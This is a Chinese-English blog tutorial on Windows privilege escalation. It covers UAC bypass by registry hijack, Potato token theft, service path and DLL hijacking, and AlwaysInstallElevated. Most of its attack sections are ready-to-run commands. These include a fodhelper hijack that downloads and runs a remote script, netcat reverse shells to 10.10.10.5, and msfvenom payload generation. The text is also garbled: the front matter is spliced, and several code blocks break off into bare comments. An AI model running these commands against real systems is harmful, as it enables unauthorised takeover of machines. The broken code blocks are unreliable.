---
title: "Windows privilege escalation techniques—UAC bypass, token theft, service path hijacking"
url: "en/windows-privilege-escalation"
date: "2026-01-18"
draft: false
summary: "Panorama of Windows privilege escalation technologies, UAC bypass, Potato series token theft, service path hijacking and WinPEAS automated enumeration"
authors: ["default"]
tags:
  - Windows
  - Elevate privileges
  - UAC bypass
  - token theft
images: ["https://images.unsplash.com/photo-1504639725590-34d0984388bd?auto=formatimages: ["https://images.unsplash.com/photo-1504639725590-34d0984388bd?auto=format&fit=crop&w=1200&q=80"]fit=cropimages: ["https://images.unsplash.com/photo-1504639725590-34d0984388bd?auto=format&fit=crop&w=1200&q=80"]w=1200images: ["https://images.unsplash.com/photo-1504639725590-34d0984388bd?auto=format&fit=crop&w=1200&q=80"]q=80"]
categories:
  - Penetration testing
---

# Windows privilege escalation techniques—UAC bypass, token theft, service path hijacking

In penetration testing, initial access is usually limited to normal user rights. To further control the system, access sensitive data, or perform lateral movement, privilege escalation is the only way to go. Windows systems have a complex permission model, but there are also many privilege escalation vectors that can be exploited. This article will systematically explain the core technologies of Windows privilege escalation, from the basics of the permission model to advanced technologies such as UAC bypass, token operation, and service hijacking, as well as how to use automated enumeration tools.

## Windows permission model basics

Before understanding Windows privilege escalation technology, you need to master the core concepts of the Windows permission system.

### Users and user groups

Windows manages permissions through user groups. Key built-in groups include:

- **Administrators** — Full control permissions

```cmd
:: 查看当前用户信息
whoami
whoami /priv
whoami /groups

:: 查看本地用户和组
net user
net localgroup Administrators

:: 查看系统信息
systeminfo
hostname
```

### 访问令牌（Access Token）

Windows 中每个进程都关联一个访问令牌，令牌包含用户的 SID、所属组和特权列表。关键特权包括：

| 特权名称 | 提权潜力 | 利用方法 |
|----------|---------|---------|
| SeImpersonatePrivilege | 高 | Potato 系列攻击 |
| SeAssignPrimaryTokenPrivilege | 高 | 令牌替换 |
| SeBackupPrivilege | 高 | 读取任意文件/注册表 |
| SeRestorePrivilege | 高 | 写入任意文件 |
| SeTakeOwnershipPrivilege | 高 | 获取文件所有权 |
| SeDebugPrivilege | 高 | 调试任意进程 |
| SeLoadDriverPrivilege | 高 | 加载内核驱动 |

### 完整性级别（Integrity Levels）

Windows Vista 之后引入的强制完整性控制（MIC）将进程分为不同的完整性级别：

- **System** — 系统级别（内核和系统服务）
- **High** — 管理员级别（提升后的管理员进程）
- **Medium** — 标准用户级别（普通用户进程）
- **Low** — 低完整性（浏览器沙箱等）

```powershell
# 查看当前进程完整性级别
whoami /groups | findstr "Mandatory"

# Use Process Explorer to view process tokens and integrity levels

## UAC bypass techniques

User Account Control (UAC) is a security barrier in Windows that runs at the Medium integrity level by default even if the user belongs to the Administrators group. UAC bypass is a critical step in obtaining High integrity processes.

### fodhelper.exe bypass

fodhelper.exe is a Windows built-in auto-elevate program, and its execution process can be hijacked by modifying the registry.

```powershell
# 方法一：PowerShell 实现 fodhelper UAC 绕过
# 创建注册表项
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(Default)" -Value "cmd.exe /c powershell.exe -ep bypass -nop -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.5/shell.ps1')" -Force

# 触发 fodhelper
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

# 清理注册表
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
```

### eventvwr.exe 绕过

事件查看器（eventvwr.exe）同样是自动提升程序，可通过注册表劫持实现 UAC 绕过。

```powershell
# eventvwr.exe UAC 绕过
New-Item "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(Default)" -Value "cmd.exe /c start powershell.exe" -Force

# trigger

# clean up

### Other UAC bypass methods

```cmd
:: 使用 UACME 工具（集成了大量 UAC 绕过方法）
:: https://github.com/hfiref0x/UACME
Akagi64.exe 23 C:\Windows\System32\cmd.exe

:: computerdefaults.exe 绕过
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "cmd.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /f
computerdefaults.exe
```

## 令牌窃取与模拟

当用户拥有 `SeImpersonatePrivilege` 或 `SeAssignPrimaryTokenPrivilege` 特权时（通常为服务账户如 IIS、MSSQL），可以通过令牌操作提升到 SYSTEM 权限。

### Meterpreter Incognito

```bash
# 在 Meterpreter 会话中
meterpreter > use incognito
meterpreter > list_tokens -u

# Impersonate admin token

# Confirm permissions

### JuicyPotato

JuicyPotato leverages the COM server's token negotiation process to elevate the service account's `SeImpersonatePrivilege` to SYSTEM.

```cmd
:: 检查是否有 SeImpersonatePrivilege
whoami /priv

:: 使用 JuicyPotato
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\Temp\nc.exe 10.10.10.5 4444 -e cmd.exe" -t *

:: 需要指定 CLSID（不同 Windows 版本 CLSID 不同）
:: Windows Server 2016:
JuicyPotato.exe -l 1337 -p C:\Temp\rev.exe -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
```

### PrintSpoofer

PrintSpoofer 利用 Windows 打印后台处理服务的命名管道模拟漏洞，适用于 Windows 10 和 Server 2019 等较新系统。

```cmd
:: PrintSpoofer 提权
PrintSpoofer64.exe -i -c cmd

:: Directly execute the reverse shell
PrintSpoofer64.exe -c "C:\Temp\nc.exe 10.10.10.5 4444 -e cmd.exe"
```

### GodPotato and SweetPotato

```cmd
:: GodPotato（支持 Windows Server 2012 到 2022 全版本）
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "cmd /c C:\Temp\nc.exe 10.10.10.5 4444 -e cmd.exe"

:: SweetPotato
SweetPotato.exe -p C:\Temp\nc.exe -a "10.10.10.5 4444 -e cmd.exe"
```

## 服务路径劫持

Windows 服务的配置错误是常见的提权向量。

### 不带引号的服务路径（Unquoted Service Path）

当服务的可执行文件路径包含空格且未用引号括起时，Windows 会按照特定顺序尝试解析路径，攻击者可以在中间路径放置恶意可执行文件。

```cmd
:: 查找不带引号的服务路径
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

::PowerShell queries
Get-WmiObject win32_service | Where-Object {$_.PathName -notlike "C:\Windows\*" -and $_.PathName -notlike '"*'} | Select-Object Name, PathName, StartMode

:: For example, the path is: C:\Program Files\Vulnerable App\Service.exe
:: Windows will try:
::C:\Program.exe
:: C:\Program Files\Vulnerable.exe
:: C:\Program Files\Vulnerable App\Service.exe

:: Check if you have write permission
icacls "C:\Program Files\Vulnerable App\"

:: If writable, place malicious file
:: Generate payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f exe -o Vulnerable.exe
:: Copy Vulnerable.exe to C:\Program Files\

::Restart service
sc stopVulnService
sc startVulnService
```

### Writable service binary

```cmd
:: 检查服务二进制的文件权限
icacls "C:\Services\CustomApp\service.exe"
:: 如果 BUILTIN\Users 有 (F) 或 (M) 权限，可以替换

:: 备份原文件
copy "C:\Services\CustomApp\service.exe" "C:\Temp\service_backup.exe"

:: 替换为恶意文件
copy /Y C:\Temp\malicious.exe "C:\Services\CustomApp\service.exe"

:: 重启服务触发执行
sc stop CustomService
sc start CustomService
```

### 服务权限修改

```cmd
:: 使用 accesschk 检查服务权限
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv "Users" *

:: If you have SERVICE_CHANGE_CONFIG permission on a service
sc config VulnService binpath= "C:\Temp\nc.exe 10.10.10.5 4444 -e cmd.exe"
sc config VulnService obj= ".\LocalSystem" password= ""
sc stopVulnService
sc startVulnService
```

## DLL hijacking

Windows applications follow a specific search order when loading DLLs, and if an attacker can place a malicious DLL in a high-priority path, code execution can be achieved.

```bash
# 使用 Process Monitor 监控 DLL 加载失败
# 筛选条件：Operation = CreateFile, Result = NAME NOT FOUND, Path ends with .dll

# 生成恶意 DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f dll -o hijack.dll

# 将 DLL 放置到目标应用程序目录
# 等待应用程序或服务启动时加载
```

```powershell
# 查找可写的 PATH 目录
$env:Path -split ';' | ForEach-Object {
    $path = $_
    try {
        $acl = Get-Acl $path -ErrorAction SilentlyContinue
        $acl.Access | Where-Object {
            $_.IdentityReference -match "Users|Everyone|Authenticated" -and
            $_.FileSystemRights -match "Write|Modify|FullControl"
        } | ForEach-Object {
            Write-Output "WRITABLE: $path - $($_.IdentityReference) - $($_.FileSystemRights)"
        }
    } catch {}
}
```

## AlwaysInstallElevated exploit

When the group policy `AlwaysInstallElevated` is enabled, any user can install MSI packages with SYSTEM privileges.

```cmd
:: 检查是否启用
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

:: 两个键值都为 1 时存在漏洞
```

```bash
# 生成恶意 MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f msi -o evil.msi

# Install on target machine

## Automated enumeration tools

Manually checking each privilege escalation vector is inefficient. The following tools can automatically enumerate all potential privilege escalation paths in the system.

### WinPEAS

```cmd
:: 运行 WinPEAS 全面枚举
winPEASx64.exe

:: 仅检查特定类别
winPEASx64.exe servicesinfo
winPEASx64.exe userinfo
winPEASx64.exe systeminfo

:: 将输出保存到文件
winPEASx64.exe > C:\Temp\winpeas_output.txt
```

WinPEAS 会自动检查以下内容：

- 系统信息和补丁级别
- 用户权限和令牌特权
- 服务配置错误（不带引号路径、可写二进制、弱权限）
- 计划任务
- 注册表自启动项
- 已安装软件的已知漏洞
- 凭据文件和历史记录
- AlwaysInstallElevated 配置

### PowerUp

```powershell
# 导入 PowerUp（PowerSploit 的一部分）
Import-Module .\PowerUp.ps1

# Run all checks

# Check unquoted service paths individually

# Check for modifiable services

# Check for modifiable service binaries

# Automatically exploit discovered vulnerabilities

# Check AlwaysInstallElevated

# Check auto-start items

### Other enumeration tools

```cmd
:: Seatbelt — 安全审计枚举
Seatbelt.exe -group=all

:: SharpUp — C# 版 PowerUp
SharpUp.exe audit

:: PrivescCheck — PowerShell 提权检查
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"

:: Windows Exploit Suggester
systeminfo > sysinfo.txt
python3 windows-exploit-suggester.py --database 2024-01-01-mssb.xls --systeminfo sysinfo.txt
```

## 安全建议与防御措施

1. **保持系统更新** — 及时安装安全补丁，修复已知提权漏洞
2. **配置 UAC 为最高级别** — 组策略中设置 "始终通知"
3. **最小权限原则** — 服务账户使用专用低权限账户运行，避免使用 SYSTEM
4. **审查服务配置** — 修复不带引号的路径，确保服务二进制文件权限正确
5. **移除不必要的特权** — 审查并移除 SeImpersonate 等危险特权
6. **禁用 AlwaysInstallElevated** — 确保该策略未被启用
7. **应用程序白名单** — 使用 AppLocker 或 WDAC 限制可执行文件
8. **监控异常行为** — 使用 EDR 监控提权工具的执行和注册表修改

## 总结

Windows 提权是渗透测试中承上启下的关键环节，连接着初始访问和后渗透阶段。本文涵盖了主要的提权技术：

- **UAC 绕过** — 通过注册表劫持 auto-elevate 程序突破 UAC 限制
- **令牌操作** — 利用 SeImpersonatePrivilege 通过 Potato 系列工具提升到 SYSTEM
- **服务劫持** — 利用不带引号路径、可写二进制、弱服务权限实现提权
- **DLL 劫持** — 利用 DLL 搜索顺序劫持应用程序加载
- **AlwaysInstallElevated** — 利用 MSI 安装策略的错误配置

在实战中，建议先使用 WinPEAS、PowerUp 等工具自动枚举，快速定位可利用的提权路径，再结合手动验证确保利用的准确性和隐蔽性。下一篇将进入域渗透领域，讲解 Active Directory 环境的攻击技术。

